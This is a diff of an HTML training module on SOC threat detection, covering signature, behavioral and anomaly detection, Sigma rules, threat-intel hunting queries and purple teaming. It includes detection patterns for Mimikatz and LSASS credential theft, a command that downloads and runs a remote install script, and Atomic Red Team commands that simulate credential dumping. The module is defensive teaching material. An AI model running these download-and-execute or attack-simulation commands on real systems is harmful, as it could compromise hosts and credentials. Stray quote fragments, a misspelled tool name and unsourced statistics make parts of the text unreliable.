@@ -1,82 +1,681 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
-<h6 class="text-info mb-3"><i class="bi bi-book me-2"></i>Module 7: Network Security Monitoring</h6>
+<h6 class="text-danger mb-3"><i class="bi bi-shield-exclamation me-2"></i>Module 7: Threat Detection</h6>
 
-<p style="color:#c0d0e0;">Network Security Monitoring (NSM) involves capturing and analyzing network traffic to detect intrusions, policy violations, and suspicious activity using IDS/IPS tools like Snort and Suricata.</p>
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-info-circle me-2"></i>1. SECTION OVERVIEW</h6>
+<p style="color:#c0d0e0;"><strong>What is Threat Detection?</strong> Threat detection is the practice of identifying malicious activity within an organization's environment before damage occurs — or as quickly as possible afterward. It combines signature-based detection (known bad patterns), behavioral detection (anomalies from baseline), and threat intelligence (known attacker infrastructure) to generate alerts that SOC analysts investigate. Effective threat detection requires understanding how attackers operate — their tools, techniques, procedures (TTPs) — and building detection rules that catch them at each stage of the attack lifecycle.</p>
+<p style="color:#c0d0e0;"><strong>Why It Matters:</strong> The global average dwell time (time from compromise to detection) was 277 days in 2025 (IBM). In that time, attackers can exfiltrate terabytes of data, deploy ransomware across thousands of hosts, and establish multiple persistence mechanisms. Earlier detection directly reduces breach cost — containing an incident in days costs $1.2M on average, while containing it in weeks costs $4.5M+. Threat detection is the SOC's primary value proposition: turning raw data into actionable alerts that stop attacks.</p>
+<p style="color:#c0d0e0;"><strong>Real-World Use Cases:</strong> Detecting Cobalt Strike beaconing via JA3 fingerprint matching; identifying Log4j exploitation attempts via WAF logs; catching ransomware encryption via file extension monitoring; finding credential theft via LSASS access detection; discovering data exfiltration via DNS tunneling analysis; spotting living-off-the-land (LOLBins) abuse via process chain analysis.</p>
+<p style="color:#c0d0e0;"><strong>Skills Gained:</strong> Detection rule writing (Sigma, SPL, KQL, EQL); behavioral vs signature-based detection; threat intelligence integration; hunting methodologies; detection engineering lifecycle; false positive analysis and tuning; purple team exercise execution.</p>
+<p style="color:#c0d0e0;"><strong>Prerequisites:</strong> SIEM fundamentals, understanding of common attack types, Windows and Linux system administration, basic scripting.</p>
+<p style="color:#c0d0e0;"><strong>Learning Objectives:</strong> (1) Differentiate between signature-based, behavioral, and anomaly-based detection, (2) Write effective detection rules using Sigma for any SIEM platform, (3) Create a detection coverage heatmap mapped to MITRE ATT&CK, (4) Execute a purple team exercise using Atomic Red Team to validate detection coverage, (5) Apply threat intelligence to detect emerging threats proactively.</p>
 
-<h6 class="text-info mt-3">Sub-Domains / Rooms</h6>
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-journal-text me-2"></i>2. DETAILED NOTES</h6>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Snort Basics and Rules</p>
-<p style="color:#c0d0e0;">Snort is the most widely used open-source Intrusion Detection/Prevention System (IDS/IPS). It uses rules to match patterns in network traffic.</p>
+<p style="color:#00d4ff;font-weight:600;">Subtopic 1: Detection Methodologies — Signature, Behavioral, and Anomaly</p>
+<p style="color:#c0d0e0;">There are three fundamental approaches to threat detection, each with strengths and weaknesses. A mature SOC uses all three in layers — no single methodology catches everything. Understanding when to use each approach is a core detection engineering skill.</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Snort Rule Structure:</b><br>
-<code>[action] [protocol] [source_ip] [source_port] -> [dest_ip] [dest_port] ([rule_options])</code><br><br>
-<b>Example Rules for SOC:</b><br><br>
-<b>1. Detect SQL Injection:</b><br>
-<code>alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (<br>
-  msg:"SQL Injection — UNION SELECT detected";<br>
-  content:"UNION"; nocase; content:"SELECT"; nocase; distance:0;<br>
-  flow:to_server,established;<br>
-  sid:1000001; rev:1;)</code><br>
-→ Flags any HTTP request containing both "UNION" and "SELECT" (SQLi indicator)<br><br>
-<b>2. Detect C2 Beaconing:</b><br>
-<code>alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (<br>
-  msg:"Possible C2 Beaconing — frequent HTTPS connections";<br>
-  flow:to_server;<br>
-  detection_filter: track by_src, count 30, seconds 60;<br>
-  sid:1000002; rev:1;)</code><br>
-→ Alerts when a host makes 30+ HTTPS connections in 60 seconds<br><br>
-<b>3. Detect DNS Tunneling:</b><br>
-<code>alert udp $HOME_NET any -> $DNS_SERVERS 53 (<br>
-  msg:"Possible DNS Tunneling — long subdomain";<br>
-  dsize:>100;<br>
-  content:"|00|"; within:5;<br>
-  sid:1000003; rev:1;)</code><br>
-→ DNS queries with payloads over 100 bytes could be tunneling data<br><br>
-<b>4. Detect SMB Exploit (EternalBlue):</b><br>
-<code>alert tcp $HOME_NET 445 -> $EXTERNAL_NET any (<br>
-  msg:"EternalBlue Exploit Attempt";<br>
-  content:"|00 00 00 31|"; offset:0; depth:4;<br>
-  content:"|ff 53 6d 62|"; within:5;<br>
-  sid:1000004; rev:1;)</code><br>
-→ Detects SMBv1 exploit pattern used by WannaCry and NotPetya
+<b>1. Signature-Based Detection (Known Bad)</b><br>
+Matches traffic, files, or behavior against known indicators of compromise (IoCs).<br>
+- <b>Examples:</b> Malware hash detection (SHA256), YARA rules matching file content, Snort/Suricata rules matching network patterns, IP/Domain blocklists, String matching in process command lines<br>
+- <b>Strengths:</b> Fast, low false positive rate for the specific pattern, easy to understand, easy to test<br>
+- <b>Weaknesses:</b> Detects only known threats, requires constant updates, fails against variants and zero-days, attacker can change one byte to bypass hash detection<br>
+- <b>Real-World Example:</b> A YARA rule detecting the string "LockBit" in a process memory — catches known LockBit ransomware variants. But if the attacker renames the executable and changes the mutex name, the rule misses it.<br><br>
+<b>2. Behavioral Detection (Known Suspicious)</b><br>
+Detects actions that are inherently suspicious regardless of the specific tool or malware variant.<br>
+- <b>Examples:</b> Process spawning cmd.exe with network connection (lateral movement), PowerShell executing encoded commands, Service installed from remote location, Volume Shadow Copy deletion, Registry Run key modification<br>
+- <b>Strengths:</b> Detects unknown malware and zero-days, hard for attackers to bypass (they need to change their behavior, not just their tools), catches TTPs not just IoCs<br>
+- <b>Weaknesses:</b> Higher false positive rate (legitimate software also does suspicious things), requires understanding of normal vs abnormal behavior, more complex to implement<br>
+- <b>Real-World Example:</b> A rule detecting "process svchost.exe spawning PowerShell" catches any malware using this technique — regardless of the payload. Even if the attacker uses a brand-new never-before-seen C2 tool, the behavioral rule still fires.<br><br>
+<b>3. Anomaly-Based Detection (Unknown Suspicious)</b><br>
+Establishes a baseline of "normal" and alerts when behavior deviates significantly.<br>
+- <b>Examples:</b> User login from unusual geographic location, Server outbound traffic volume 500% above baseline, User accessing systems they've never accessed before, Process running at time of day it never runs<br>
+- <b>Strengths:</b> Detects insider threats and account compromise, catches attackers who use legitimate tools (LOLBins), adapts to environment changes<br>
+- <b>Weaknesses:</b> Highest false positive rate, requires significant baseline data (30+ days), "normal" constantly changes, difficult to tune, computational intensive<br>
+- <b>Real-World Example:</b> A database server that normally sends 100 MB/day outbound suddenly sends 5 GB/day at 3 AM — anomaly detection flags this regardless of what protocol or tool is being used. Could be data exfiltration using encrypted HTTPS that no signature rule could detect.<br><br>
+<b>Detection Type Comparison Matrix:</b><br>
+| Aspect | Signature | Behavioral | Anomaly |
+|--------|-----------|------------|---------|
+| Detection Rate (known) | 95%+ | 80-90% | 40-60% |
+| Detection Rate (unknown) | 0-5% | 60-80% | 40-60% |
+| False Positive Rate | 5-15% | 15-30% | 30-50% |
+| Maintenance Effort | High (update constantly) | Medium | Low (after baseline) |
+| Evasion Difficulty | Easy | Hard | Moderate |
+| Best For | Known malware, C2 IPs | TTPs, LOLBins | Insider threats, APT |
 </div>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Network Monitoring Labs</p>
-<p style="color:#c0d0e0;">Hands-on practice with real network traffic analysis using Snort, Suricata, and Security Onion.</p>
+<p style="color:#00d4ff;font-weight:600;">Subtopic 2: Detection Engineering — Sigma Rules and the Detection Lifecycle</p>
+<p style="color:#c0d0e0;">Detection engineering is the practice of designing, implementing, testing, and maintaining detection rules. The Sigma format (created by Florian Roth and Thomas Patzke) has become the industry standard for writing SIEM-agnostic detection rules — write once, convert to any SIEM (Splunk, Elastic, QRadar, ArcSight, etc.). A proper detection engineering lifecycle ensures rules are effective, tested, and maintained.</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Lab Scenario — Detecting a Port Scan:</b><br>
-You have Snort running on your network. You see this alert:<br><br>
-<code>05/21-14:32:15.123456 [**] [1:1000005:1] Port Scan Detected [**]<br>
-[Priority: 2] {TCP} 45.33.32.156:54321 -> 10.0.1.50:22<br>
-05/21-14:32:15.123789 [**] [1:1000005:1] Port Scan Detected [**]<br>
-[Priority: 2] {TCP} 45.33.32.156:54321 -> 10.0.1.50:80<br>
-05/21-14:32:15.124123 [**] [1:1000005:1] Port Scan Detected [**]<br>
-[Priority: 2] {TCP} 45.33.32.156:54321 -> 10.0.1.50:443<br>
-05/21-14:32:15.124567 [**] [1:1000005:1] Port Scan Detected [**]<br>
-[Priority: 2] {TCP} 45.33.32.156:54321 -> 10.0.1.50:3389</code><br><br>
-<b>Analysis:</b> Same source IP (45.33.32.156) scanning multiple ports on the same destination (10.0.1.50). This is reconnaissance — attacker checking for open services. The scan hit SSH (22), HTTP (80), HTTPS (443), and RDP (3389).<br><br>
-<b>Action:</b> Block source IP at firewall, check if any services are exposed unnecessarily, review firewall rules.<br><br>
-<b>Lab Scenario — Malware Traffic Detection:</b><br>
-Snort alerts on a host making HTTP requests with a suspicious User-Agent:<br><br>
-<code>alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (<br>
-  msg:"Suspicious User-Agent — possible malware";<br>
-  content:"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0";<br>
-  flow:to_server,established;<br>
-  sid:1000006; rev:1;)</code><br><br>
-<b>Why suspicious:</b> The User-Agent string is old (Firefox 12 from 2012) but the host is running Windows 10. Malware often uses hardcoded or outdated User-Agent strings because they don't update with the browser.
+<b>Sigma Rule Anatomy:</b><br>
+<code>title: Suspicious PowerShell - Encoded Command<br>
+id: 1a2b3c4d-5e6f-7890-abcd-ef1234567890<br>
+status: experimental<br>
+description: Detects PowerShell execution with EncodedCommand parameter which is heavily used by malware<br>
+author: SOC Analyst<br>
+date: 2026/05/21<br>
+tags:<br>
+    - attack.execution<br>
+    - attack.t1059.001<br>
+logsource:<br>
+    category: process_creation<br>
+    product: windows<br>
+detection:<br>
+    selection:<br>
+        Image|endswith: '\powershell.exe'<br>
+        CommandLine|contains: '-EncodedCommand'<br>
+    condition: selection<br>
+falsepositives:<br>
+    - Legitimate administrative scripts using encoded commands<br>
+level: high</code><br><br>
+<b>Sigma Rule Fields Explained:</b><br>
+- <b>title/description:</b> Human-readable explanation of what the rule detects<br>
+- <b>id:</b> UUID for tracking, linking to MITRE ATT&CK, and managing rules across deployments<br>
+- <b>status:</b> experimental (testing), test (validated), stable (production-ready), deprecated<br>
+- <b>tags:</b> MITRE ATT&CK mapping (tactic.technique.subtechnique)<br>
+- <b>logsource:</b> What log source is needed (product, category, service)<br>
+- <b>detection:</b> The detection logic — selection conditions with field matching, then condition (all/any/1 of them/1 of selection, etc.)<br>
+- <b>falsepositives:</b> Expected legitimate scenarios that trigger this rule<br>
+- <b>level:</b> Severity (informational, low, medium, high, critical)<br><br>
+<b>Advanced Sigma — Correlation Rules:</b><br>
+Sigma also supports rules that combine multiple conditions:<br>
+<code>title: Mimikatz Detection via Process Access<br>
+logsource:<br>
+    category: process_access<br>
+    product: windows<br>
+detection:<br>
+    selection:<br>
+        CallTrace|contains: 'C:\Windows\SYSTEM32\ntdll.dll+'<br>
+        SourceImage|endswith: '\mimikatz.exe'<br>
+    selection_filter:<br>
+        SourceImage|endswith: '\svchost.exe'<br>
+    condition: selection and not selection_filter</code><br><br>
+<b>Detection Engineering Lifecycle:</b><br>
+1. <b>Research:</b> Study the attack technique. Read MITRE ATT&CK details, analysis reports, malware write-ups. Understand: What exactly does the attacker do? What log events are generated? What does "normal" look like?<br>
+2. <b>Design:</b> Write detection logic. Choose detection type (signature, behavioral, anomaly). Define conditions precisely — what field values indicate malicious? What are the false positive sources? Write Sigma rule or SIEM-specific query.<br>
+3. <b>Implementation:</b> Deploy the rule in a test environment first. Ensure the log source is available and configured correctly. Convert Sigma to target SIEM format.<br>
+4. <b>Validation:</b> Test with known malicious traffic. Use Atomic Red Team or real malware samples. Verify: does the rule fire when expected? Does it NOT fire for normal traffic?<br>
+5. <b>Tuning:</b> After 1-2 weeks in production, review all alerts. Calculate FP rate. Add exceptions for known FPs. Adjust thresholds if needed.<br>
+6. <b>Deployment:</b> Move rule to production with appropriate severity. Enable alerting. Document in rule catalog.<br>
+7. <b>Maintenance:</b> Review rule quarterly. Check if new false positives emerged. Update as attacker TTPs evolve. Retire rules that no longer detect real threats.<br><br>
+<b>Common Detection Engineering Mistakes:</b><br>
+- <b>Overly Broad:</b> Rule matches 90% of legitimate traffic — analyst ignores it within a day<br>
+- <b>Overly Specific:</b> Rule matches exact malware filename — attacker renames file, rule misses<br>
+- <b>Log Source Not Available:</b> Rule requires Sysmon Event ID 10 (ProcessAccess) but only Windows Event Log is forwarded<br>
+- <b>No False Positive Testing:</b> Deploying a rule without testing against normal traffic leads to alert fatigue<br>
+- <b>No MITRE Mapping:</b> Without mapping to ATT&CK, you don't know what techniques you cover vs miss
 </div>
 
-<h6 class="text-info mt-3">Snort vs Suricata vs Zeek</h6>
+<p style="color:#00d4ff;font-weight:600;">Subtopic 3: Threat Intelligence Integration for Detection</p>
+<p style="color:#c0d0e0;">Threat intelligence (CTI) turns raw data into context — telling you which IPs, domains, hashes, and TTPs are associated with known adversaries. Integrating CTI into detection rules dramatically improves detection accuracy. Without CTI, you can detect "a process made an outbound connection" — with CTI, you detect "a process made an outbound connection to a known APT29 C2 infrastructure."</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-| Tool | Type | Key Feature | Best For |
-|------|------|-------------|----------|
-| Snort | IDS/IPS | Signature-based detection | Small to medium networks |
-| Suricata | IDS/IPS | Multi-threading, GPU acceleration | High-throughput networks |
-| Zeek | NSM Framework | Protocol analysis, logging, not blocking | Network visibility & forensics |
+<b>Threat Intelligence Tiers (CERT/CSIRT):</b><br>
+- <b>Strategic:</b> High-level trends, adversary motivations, geopolitical context. For SOC manager and CISO. (Annual reports, industry threat briefs)<br>
+- <b>Operational:</b> Adversary TTPs, tools, infrastructure patterns. For detection engineers. (APT reports, malware analysis papers)<br>
+- <b>Tactical:</b> Specific IoCs — IPs, domains, hashes, URLs. For SOC analysts. (Blocklists, threat intel feeds)<br>
+- <b>Technical:</b> Detailed technical indicators — YARA rules, Sigma rules, Snort rules. For detection engineers and automation.<br><br>
+<b>Threat Intelligence Sources for SOC:</b><br>
+| Source | Type | Update Frequency | Coverage |
+|--------|------|-----------------|----------|
+| AlienVault OTX | Free/Open | Real-time | Broad — malware, C2, scanners |
+| MISP | Community sharing | Real-time | Peer-shared, diverse IoC types |
+| VirusTotal | Freemium | Real-time | File hashes, URL detection |
+| AbuseIPDB | Free | Daily | IP reputation, abuse reports |
+| GreyNoise | Free tier | Real-time | Noise elimination (scanners, crawlers) |
+| Feodo Tracker | Free | Daily | C2 infrastructure (Dridex, Emotet, etc.) |
+| URLHaus | Free | Real-time | Malicious URLs by type |
+| PhishTank | Free | Real-time | Phishing URLs |
+| Tor Exit Nodes | Free | Daily | Known Tor exit nodes |
+| Cobalt Strike C2 List | Community | Weekly | Known Cobalt Strike servers |<br><br>
+<b>Integrating Threat Intel into SIEM:</b><br>
+<em>Approach 1 — Static Lookups:</em> Import threat intel feeds as lookup tables in SIEM. Each event is checked against the lookup.<br>
+<code>index=proxy [| inputlookup malicious_ips.csv | fields ip as dest_ip ]</code><br><br>
+<em>Approach 2 — Enrichment at Ingestion:</em> Heavy forwarder or enrichment server checks each IP/hash/domain against threat intel at ingestion time and adds tags.<br>
+<em>Example:</em> When a Windows event arrives, check the source IP against 5 threat intel sources. If found in 2+, add tag "threat_intel_positiv' + 'e" to the event. Create rules that look for this tag.<br><br>
+<em>Approach 3 — SOAR Orchestration:</em> When an alert fires, SOAR queries threat intel APIs and adds context to the alert before analyst sees it.<br>
+<em>Automation:</em> "Alert has source IP → query AbuseIPDB → query VirusTotal → query GreyNoise → add reputation score to alert → if score > 80, escalate priority"<br><br>
+<b>CTI-Driven Detection — Real Example:</b><br>
+A new Emotet phishing campaign is reported by CISA. IOCs provided:<br>
+- Email subject: "Invoice #28472"<br>
+- Attachment: "Invoice_28472.docm"<br>
+- C2 domain: emotet-c2-2026.example.net<br>
+- C2 IP: 185.220.101.5<br><br>
+<em>Detection Actions:</em><br>
+1. <b>Immediate (signed rules):</b> Block C2 IP and domain at firewall and DNS. Add email subject and attachment name to email gateway filter. Add hash to EDR blocklist.<br>
+2. <b>Short-term (Sigma rule):</b> Write rule: PowerShell from Office with network connection matching known Emotet behavior patterns.<br>
+3. <b>Long-term (behavioral):</b> Create behavioral rule: Office application spawning a child process with network connection = high-fidelity malware indicator.<br><br>
+<b>Threat Hunting with CTI:</b><br>
+Hunt hypothesis: "Are any of our hosts communicating with APT29's known infrastructure?"<br>
+<code>index=proxy dest_ip IN (45.33.32.156, 91.200.100.50, 5.188.62.10)<br>
+| stats count, sum(bytes) by src_ip, dest_ip<br>
+| where count > 5 OR sum(bytes) > 1000000<br>
+| table src_ip, dest_ip, count, sum(bytes)</code><br><br>
+If results found, investigate: Are these scheduled connections (C2 beaconing) or one-time? What process made them? What data was sent?
+</div>
 
-<b>Deployment Architectures:</b><br>
-- <b>Inline (IPS):</b> Device sits directly in traffic path, can block malicious packets in real-time<br>
-- <b>Passive (IDS):</b> Device receives copy of traffic via SPAN port or TAP, alerts only (no blocking)<br>
-- <b>Hybrid:</b> Critical threats blocked inline, suspicious traffic alerted for analyst review
+<p style="color:#00d4ff;font-weight:600;">Subtopic 4: Hunting, Purple Teaming, and Coverage Validation</p>
+<p style="color:#c0d0e0;">Detection rules are only useful if they actually work when attacked. Purple teaming is the practice of simulating real adversary behavior in your environment to validate that your detection rules fire correctly. Atomic Red Team (ART) is the most popular tool for this — it executes specific ATT&CK techniques safely and provides a framework for measuring detection coverage.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Purple Team Exercise Methodology:</b><br>
+1. <b>Select Technique:</b> Pick a specific MITRE ATT&CK technique (e.g., T1059.001 — PowerShell Execution).<br>
+2. <b>Review Existing Detection:</b> What rules do you have for this technique? What log sources are needed?<br>
+3. <b>Execute Simulation:</b> Run the Atomic Red Team test for the technique in a test environment.<br>
+4. <b>Observe Detection:</b> Did your SIEM generate an alert? Was it the expected rule? Did the alert have enough context?<br>
+5. <b>Measure Coverage:</b> If detected → success. If not → find the gap (missing log? rule not deployed? wrong logic?).<br>
+6. <b>Improve:</b> Fix the gap, re-run the test, confirm detection, update documentation.<br><br>
+<b>Atomic Red Team — Installation and Usage:</b><br>
+<code># Install on Windows VM<br>
+IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);<br>
+Install-AtomicRedTeam -getAtomics<br><br>
+# Execute a specific test<br>
+Invoke-AtomicTest T1059.001 -TestNumbers 1<br><br>
+# Execute all tests for a technique<br>
+Invoke-AtomicTest T1003.001<br><br>
+# Execute all tests for a tactic<br>
+Invoke-AtomicTest T1055 -Tactic Execution<br><br>
+# Run tests from a CSV of techniques<br>
+Invoke-AtomicTest -InputPath C:\tests\t1003_credential_access.csv</code><br><br>
+<b>Building a Coverage Heatmap:</b><br>
+Track detection coverage for each MITRE ATT&CK technique:<br>
+| Technique | Name | Rule Exists? | Log Source? | Last Tested | Detection | Coverage |
+|-----------|------|-------------|-------------|-------------|-----------|----------|
+| T1059.001 | PowerShell | Yes | Sysmon EID 1 | 2026-05-21 | ✅ | Full |
+| T1003.001 | LSASS Memory | Yes | Sysmon EID 10 | 2026-05-15 | ✅ | Full |
+| T1021.001 | RDP Lateral Movement | Yes | Windows EID 4624 | 2026-04-01 | ⚠️ | Partial |
+| T1055 | Process Injection | No | Sysmon EID 8 | Never | ❌ | None |
+| T1486 | Data Encrypted | Yes | Sysmon EID 11 | 2026-05-20 | ✅ | Full |<br><br>
+<b>Hunting Methodology — Hypothesis-Driven:</b><br>
+Unlike reactive detection (waiting for alerts), hunting proactively searches for signs of compromise.<br><br>
+<b>Hunting Loop:</b><br>
+1. <b>Hypothesis:</b> "I believe an attacker may be using mshta.exe to execute malicious HTA payloads because I read a report about recent TA551 campaigns."<br>
+2. <b>Create Query:</b> <code>index=process_creation Image|endswith="mshta.exe" | where not ParentImage in ("C:\\Program Files\\*", "C:\\Windows\\System32\\*")</code><br>
+3. <b>Analyze Results:</b> Found 3 mshta executions from %TEMP% directory — highly suspicious. Investigate each.<br>
+4. <b>Confirm or Refute:</b> One was a legitimate IT tool. Two were malicious — started from Office documents. Hunting success.<br>
+5. <b>Create Permanent Detection:</b> Convert hunting query into a permanent rule.<br><br>
+<b>Popular Hunting Hypothesis Examples:</b><br>
+- "Are there DNS queries to domains that look algorithmically generated (DGA)?"<br>
+- "Are any service accounts logging in from workstations?"<br>
+- "Are there scheduled tasks created by non-admin users?"<br>
+- "Are any administrative accounts authenticating from unusual IP ranges?"<br>
+- "Are there processes with suspicious parent-child relationships (e.g., Word.exe → PowerShell.exe)?"<br>
+- "Is any host making connections to known Cobalt Strike ports (50050, 443, 80) in a beacon pattern?"<br><br>
+<b>Common Attack Vectors — Detection Focus Areas:</b><br>
+| Attack Type | Key Detection Opportunity | Primary Log Source |
+|-------------|---------------------------|-------------------|
+| Phishing | Unusual parent process (Word.exe → PowerShell.exe) | Sysmon EID 1 |
+| Ransomware | Mass file renames, shadow copy deletion | Sysmon EID 11, Windows EID 4659 |
+| Credential Theft | LSASS process access (non-system) | Sysmon EID 10 |
+| Lateral Movement | Unusual service creation, scheduled task, RDP/WMI from non-admin workstations | Sysmon EID 1, Windows EID 4624 |
+| C2 Beaconing | Regular periodic outbound connections, DGA domains, JA3 fingerprints | Proxy logs, DNS logs, Zeek conn.log |
+| Data Exfiltration | Large outbound transfers, unusual protocols on standard ports | Netflow, proxy logs, DNS log siz'e |
+| Privilege Escalation | Token manipulation, service configuration abuse | Sysmon EID 1, Windows EID 4672 |
+| Persistence | Registry Run keys, scheduled tasks, WMI event subscriptions | Sysmon EID 12/13, EID 4698 |
+</div>
+
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-box-seam me-2"></i>3. CONCEPT BOXES</h6>
+
+<div class="alert alert-info">
+<strong>INFO BOX</strong><br>
+<b>Living Off the Land (LOLBins):</b> LOLBins are legitimate Microsoft-signed executables that attackers abuse to perform malicious actions while evading detection. Common examples: <code>powershell.exe</code> (script execution), <code>rundll32.exe</code> (execute DLLs), <code>mshta.exe</code> (execute HTA scripts), <code>regsvr32.exe</code> (register COM and DLLs), <code>certutil.exe</code> (download files), <code>bcedit.exe</code> (modify boot configuration), <code>vssadmin.exe</code> (delete shadow copies). Because these files are signed by Microsoft, traditional whitelisting won't block them. Detection must focus on <em>how</em> they're used (unusual parent process, unexpected command-line arguments, execution from abnormal locations).
+</div>
+
+<div class="alert alert-success">
+<strong>REMEMBER BOX</strong><br>
+<b>You Cannot Detect What You Don't Log.</b> This is the single most important principle in detection engineering. Before writing a detection rule, verify the log source is available and the relevant fields are populated. Common gaps: Sysmon not installed = no process tree, no network connections. PowerShell module logging disabled = no script block logging. Audit Process Creation not enabled = no EID 4688. EDR on servers but not workstations = blind spot on 80% of hosts. Always audit your log coverage before building your detection program.
+</div>
+
+<div class="alert alert-warning">
+<strong>WARNING BOX</strong><br>
+<b>False Positives Are Worse Than Missed Detections.</b> A missed detection means one incident slips through. A high false positive rate means all analysts stop trusting all alerts. When analysts ignore alerts, everything slips through. Studies show that when FP rate exceeds 30%, analyst response accuracy drops by 60%. When FP rate exceeds 50%, analysts effectively stop responding to alerts. Tune ruthlessly. A rule that fires 100 times per day with 95% FPs is not a detection — it's noise. Better to have 10 high-fidelity rules than 1,000 noisy ones.
+</div>
+
+<div class="alert alert-info">
+<strong>SOC ANALYST TIP</strong><br>
+<b>Master Process Tree Analysis.</b> When investigating any alert, always look at the parent-child process chain. This single technique reveals more about an attack than any other analysis. Example: <code>EmailClient.exe → WINWORD.EXE → cmd.exe → powershell.exe → rundll32.exe</code>. Even without knowing what the final payload is, the process tree tells you: the attack started from email, used a Word document with a macro, spawned a command shell, launched PowerShell, and loaded a DLL. This is a classic phishing → malware execution chain. Every SOC analyst should be able to read a process tree like reading a story.
+</div>
+
+<div class="alert alert-warning">
+<strong>INTERVIEW Q&A</strong><br>
+<b>Q: "What's your process for creating a new detection rule?"</b><br>
+<b>A:</b> "First, I research the technique — read MITRE ATT&CK, any analysis reports, and existing Sigma rules. I identify exactly what happens at the log level: what process events, network events, or file events are generated. Then I determine the best detection approach — is this a signature match (exact IoC) or behavioral (unusual parent/child)? I write the rule in Sigma format so it's portable. I test it with a real sample of the attack using Atomic Red Team — does it fire? Then I test it against normal traffic — does it NOT fire when it shouldn't? I deploy in monitor-only for 2 weeks, tune based on results, and only then enable alerting. Every rule gets documented with MITRE mapping, test evidence, and false positive notes."<br><br>
+<b>Q: "How do you measure if your detection program is effective?"</b><br>
+<b>A:</b> "I use three metrics: (1) Detection coverage — what percentage of MITRE ATT&CK techniques have detection rules? Tracked via a coverage heatmap updated after each purple team exercise. (2) Detection rate — in our last purple team, what percentage of simulated attacks were detected by automated rules vs required human hunting? Target: 70%+ detection by rules. (3) True positive rate — of all alerts generated, what percentage are actual threats? Target: >50%. If coverage is low, we need more rules. If detection rate is low, our rules don't work. If TP rate is low, our rules are noisy and need tuning."<br><br>
+<b>Q: "What's the most effective detection rule you've ever written?"</b><br>
+<b>A:</b> "A rule detecting Office applications spawning child processes with network connections. It catches phishing-based malware execution regardless of the specific malware family. The rule is simple: <code>ParentImage ends with 'WINWORD.EXE' OR 'EXCEL.EXE' OR 'OUTLOOK.EXE' AND ChildImage is 'powershell.exe' OR 'cmd.exe' OR 'wscript.exe' OR 'cscript.exe' OR 'regsvr32.exe' AND process has network connection within 60 seconds.</code> This rule has detected Emotet, TrickBot, Dridex, Qbot, IcedID, and dozens of other malware families — all without updating a single signature. False positive rate is under 5% because legitimate Office rarely spawns command-line tools with network access."
+</div>
+
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-diagram-3 me-2"></i>4. VISUAL DIAGRAMS</h6>
+<pre class="mermaid">
+flowchart TD
+    A["Raw Log Sources"] --> B["Detection Pipeline"]
+    
+    subgraph Sources["Log Sources"]
+        S1["Sysmon (Windows)"]
+        S2["Windows Event Log"]
+        S3["Firewall / Proxy"]
+        S4["DNS Logs"]
+        S5["EDR Telemetry"]
+        S6["Cloud Audit Logs"]
+    end
+    
+    subgraph Pipeline["Detection Pipeline"]
+        P1["Collect & Normalize"]
+        P2["Enrich (GeoIP, Threat Intel)"]
+        P3["Apply Detection Rules"]
+        P4["Correlation Engine"]
+    end
+    
+    Sources --> Pipeline
+    
+    P3 --> D1["Signature Rules"]
+    P3 --> D2["Behavioral Rules"]
+    P3 --> D3["Anomaly Detection (ML)"]
+    
+    subgraph Rules["Rule Types"]
+        R1["YARA (file/memory patterns)"]
+        R2["Sigma (log patterns)"]
+        R3["Snort/Suricata (network)"]
+        R4["KQL/SPL/EQL (SIEM queries)"]
+    end
+    
+    D1 --> R1
+    D1 --> R2
+    D1 --> R3
+    D1 --> R4
+    
+    P4 --> E["Alert Generation"]
+    
+    E --> F{"Alert Queue"}
+    F --> G["L1 Triage"]
+    G --> H{"Classified?"}
+    H -->|"False Positive"| I["Closed — Tune Rule"]
+    H -->|"Benign TP"| J["Closed — Note Context"]
+    H -->|"Suspicious TP"| K["Escalated to L2"]
+    H -->|"Malicious TP"| L["Immediate IR Activation"]
+    
+    K --> M["L2 Investigation"]
+    M --> N{"Confirmed?"}
+    N -->|"Yes"| O["Contain & Eradicate"]
+    N -->|"No"| I
+    
+    O --> P["Post-Incident Review"]
+    P --> Q["Update/Add Detection Rules"]
+    Q --> R["Purple Team Validation"]
+    R --> S["Updated Coverage Heatmap"]
+    S --> T["Gap Analysis"]
+    T --> U["New Detection Requirements"]
+    U --> P3
+    
+    subgraph Validation["Validation Loop"]
+        V1["Atomic Red Team Tests"]
+        V2["Coverage Heatmap"]
+        V3["Purple Team Exercises"]
+    end
+    
+    R --> Validation
+    Validation --> S
+</pre>
+
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-mortarboard me-2"></i>5. TRYHACKME SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Room</th><th style="color:#00d4ff;text-align:left;">Difficulty</th><th style="color:#00d4ff;text-align:left;">Objectives</th><th style="color:#00d4ff;text-align:left;">Completion Order</th></tr>
+<tr><td>Sigma Rules 101</td><td>Easy</td><td>Understand Sigma rule syntax, logsource categories, detection field matching, condition logic</td><td>1</td></tr>
+<tr><td>Sigma Rules 102</td><td>Medium</td><td>Write advanced Sigma rules with correlation, aggregation, temporal conditions, and field exclusions</td><td>2</td></tr>
+<tr><td>YARA 101</td><td>Easy</td><td>Learn YARA rule syntax, string matching, condition logic, modules (pe, math, hash)</td><td>3</td></tr>
+<tr><td>YARA 102</td><td>Medium</td><td>Write advanced YARA rules for malware family detection, packer detection, memory scanning</td><td>4</td></tr>
